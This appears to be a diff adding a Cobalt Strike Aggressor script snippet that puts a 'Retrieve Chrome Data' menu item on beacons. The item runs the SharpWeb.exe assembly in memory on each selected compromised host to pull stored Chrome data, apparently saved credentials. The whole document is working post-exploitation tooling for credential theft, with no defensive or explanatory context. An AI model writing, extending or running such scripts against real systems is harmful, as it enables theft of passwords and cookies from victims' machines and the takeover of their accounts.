@@ -1,0 +1,11 @@
+item "Retrieve Chrome Data"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpwebchrome($bid);
+				}
+			}
+
+####SharpWeb Chrome
+sub sharpwebchrome{
+bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "chrome");
+}
